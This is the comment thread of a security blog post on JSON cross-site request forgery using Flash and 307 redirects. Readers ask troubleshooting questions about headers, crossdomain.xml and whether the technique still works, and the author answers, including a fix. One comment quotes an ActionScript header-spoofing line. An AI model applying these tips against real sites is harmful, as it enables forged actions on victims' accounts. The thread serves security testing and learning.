      [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1402#respond) [November 25, 2017 at 2:50 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1402)
45. Pingback: [Web-Security-Learning-安全学堂大集合 | 07v8安全社区](http://www.07v8.com/article/52.html)
47. ![](https://secure.gravatar.com/avatar/bcf062dfec79936c021422d98662d5fd?s=70&d=mm&r=g) kaleem says:

    Hi Geekboy,

    I have tried the above method using Evgeniy project. My testing site does not have any CSRF protection it only rely on content type:json

    However when I try to update my profile it also has a header “Authorization Bearer token” . In POC After my first request I got 307 redirect and in the second request it calls update profile endpoint with my post data. But I don’t see “Authorization Bearer token” added in the second call automatically by the browser.

    I would like to know it does not work if it has a header or I am missing something. Please advice.

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1536#respond) [January 25, 2018 at 12:53 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1536)

    * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

      Hey, not possible with the mentioned header.

      [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1553#respond) [January 31, 2018 at 8:44 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1553)
49. ![](https://secure.gravatar.com/avatar/a7707ee2ae1933f6a24e2d852d6e6591?s=70&d=mm&r=g) Bfbbfnn says:

    X-Requested-with header any bypass for it ?

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1555#respond) [February 1, 2018 at 12:51 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1555)
51. ![](https://secure.gravatar.com/avatar/bcc8080fda378057a10c1ccc8d248ac6?s=70&d=mm&r=g) Aryan says:

    hello, i managed to add the http request headers, but the vulnerable site has no crossdomain.xml and so the request fails, I guess. On redirecting with 307, it request for testingsite.com/crossdomain.xml, which is not available, and so the csrf didnt take place? plz let me know whats wrong here!

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1574#respond) [February 5, 2018 at 8:57 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1574)
53. ![](https://secure.gravatar.com/avatar/d73f760cae722ff01a2601c419d4553b?s=70&d=mm&r=g) Pratik says:

    Hey,

    Great it worked for me . But can you please make a video for case 2 . It will be helpful for every one ..

    Thanks

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1578#respond) [February 6, 2018 at 7:07 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1578)
55. ![](https://secure.gravatar.com/avatar/5f3969ac7c85dbaf1e96417a8b26deb0?s=70&d=mm&r=g) Sahil says:

    Hello,

    I’ve been trying to test the same JSON based CSRF but as shown in the Exploitation case 2 application is validating the Content-type and data format. So, in my case the application is also validating the “origin” http header too along with content-type and therefore I need to add proper origin in the HTTP Request.

    I tried adding `request.requestHeaders.push(new URLRequestHeader(“origin”,”https://www.victimsite.com”));` on the next line after the `request.requestHeaders.push(new URLRequestHeader(“Content-Type”,”application/json”));`

    But this didn’t worked, is there anything I can do to add another HTTP Header?

    Thanks

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1691#respond) [February 18, 2018 at 1:55 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1691)
57. Pingback: [CSRF（跨站点请求伪造）在Flash中的利用 - FreeBuf互联网安全新媒体平台 | 关注黑客与极客](http://www.freebuf.com/articles/web/155189.html)
59. Pingback: [CSRF（跨站点请求伪造）在Flash中的利用 – 安百科技](https://vul.anbai.com/90312.html)
61. ![](https://secure.gravatar.com/avatar/199906c4249842940643de657c3aefb6?s=70&d=mm&r=g) IAmNoOne says:

    Hello geekboy,

    First I would like to thank you for such a nice write-up. I got stuck at one point and need to understand it in more deep.

    “This flash (.swf) file have our json formatted data which attacker have to post on the target application, and link to hosted php file in it.”

    Can you please elaborate it. I downlaoded FFDec and opened test.swf file as well but I am not finding out how to move ahead.

    Kindly guide and try if you can create and post video on this issue as most of the researchers are waiting for it from long time.

    Thanks

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1911#respond) [April 11, 2018 at 3:55 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1911)

    * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

      Check update section for the GitHub project, you don’t need to edit the file anymore, just host it and use it.

      [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1912#respond) [April 11, 2018 at 4:48 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1912)
63. ![](https://secure.gravatar.com/avatar/c2e3856da59f10227bc2bd653a683947?s=70&d=mm&r=g) Undome says:

    This is great stuff ! Thanks. However when I did same exact steps my swf file is getting downloaded rather than redirecting me to my target, I tried it on chrome, FF, IE, Canary but same result. Not sure if I’m missing anything, any guidance provided will be very helpful.

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=2036#respond) [May 13, 2018 at 4:59 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-2036)

    * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

      Instead of calling SWF file directly in the browser, load it using HTML file.

      [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=5193#respond) [September 26, 2019 at 4:54 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-5193)
65. Pingback: [Exploiting CSRF to get free recharges | | BugL0rd](http://buglord.me/2018/06/29/exploiting-csrf-to-get-free-recharges/)
67. Pingback: [Web-Security-Learning Stuff !!! – AwesomeHackers](http://awesomehackers.org/2018/07/04/web-security-learning-stuff/)
69. ![](https://secure.gravatar.com/avatar/0b60828ba65f715a63a89061423c1eb5?s=70&d=mm&r=g) prem says:

    can anyone confirm this flash based csrf method is still working? it seems fixed like sudden..

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=2468#respond) [July 10, 2018 at 8:25 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-2468)

    * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

      It still works in Google Chrome.

      [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=5195#respond) [September 26, 2019 at 4:56 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-5195)
71. ![](https://secure.gravatar.com/avatar/875bdd4ebf3dbd5678a0f10f6202bebd?s=70&d=mm&r=g) N00b says:

    Why 307 redirection is required? What if we directly specify the URL of the victim application in the .swf file?

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=3187#respond) [September 19, 2018 at 4:49 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-3187)
73. ![](https://secure.gravatar.com/avatar/a3258a1857737af019373674e1be11bb?s=70&d=mm&r=g) [dadhe](http://dsx.com) says:

    Got this error:

    ReferenceError: Error #1065: Variable JSON is not defined.

    at re$iinit()

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=3829#respond) [March 8, 2019 at 1:50 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-3829)
75. ![](https://secure.gravatar.com/avatar/443db787aff5d1cc7d3f0b81ab973d92?s=70&d=mm&r=g) Jaykumar says:

    It is still working

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=3865#respond) [March 21, 2019 at 1:13 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-3865)
77. Pingback: [Web-Security-Learning – penenote](https://penenote.com/chybeta-web-security-learning/)
79. ![](https://secure.gravatar.com/avatar/60337281e4e2608a029a4e3b08a20e0c?s=70&d=mm&r=g) Naresh says:

    Great work & thanks for the post.

    I am performing to the CSRF testing for Json request application in my pc, is the crossdomain xml file is required???

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=5018#respond) [August 27, 2019 at 5:45 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-5018)
81. Pingback: [Post request to include ‘Content-Type’ and JSON – inneka.com](https://inneka.com/programming/html/post-request-to-include-content-type-and-json/)
83. ![](https://secure.gravatar.com/avatar/ebf5e5b43384a51dba10a2cb58c47ecf?s=70&d=mm&r=g) Yash says:

    Can we add custom header with fetch method ?

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=6558#respond) [April 1, 2020 at 10:15 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-6558)

    * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

      No, for now only application/json header is possilbe.

      [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=6887#respond) [June 27, 2020 at 5:20 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-6887)
85. ![](https://secure.gravatar.com/avatar/2d3c8e05fe9ef88cce5322a22a3ee2dd?s=70&d=mm&r=g) [Throdore Ronald](http://doesnot.matter) says:

    That’ sgreat Geekboy , keep it up

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=6685#respond) [May 10, 2020 at 5:53 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-6685)
87. ![](https://secure.gravatar.com/avatar/61f2fff4567e435bd73967eaed43921b?s=70&d=mm&r=g) Ankur Gupta says:

    Hi geekboy, How to Fix this Vulnerability.

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=6877#respond) [June 25, 2020 at 6:31 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-6877)

    * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

      As this trick only works for application/JSON header, adding any custom header based CSRF protection in the request will fix this CSRF scenario.

      [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=6884#respond) [June 27, 2020 at 5:16 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-6884)
89. ![](https://secure.gravatar.com/avatar/ad14c74dcf0acdb5c25defa10dbaca73?s=70&d=mm&r=g) Ajay says:

    Is this bug(flash + 307) still exploitable ?

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=6968#respond) [July 16, 2020 at 10:15 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-6968)

    * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

      Should be doable in Chrome after manual confirmation to run flash files.

      [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=8452#respond) [December 29, 2020 at 4:46 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-8452)
91. Pingback: [CVE-2018-1000206 - CVE.report](https://cve.report/CVE-2018-1000206)

### Leave a Reply [Cancel reply](/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#respond)

Your email address will not be published. Required fields are marked \*

Comment

Name \*

Email \*

Website

 Save my name, email, and website in this browser for the next time I comment.

[Proudly powered by WordPress](http://wordpress.org/)
 |
Theme: Fictive by [WordPress.com](https://wordpress.com/themes/).


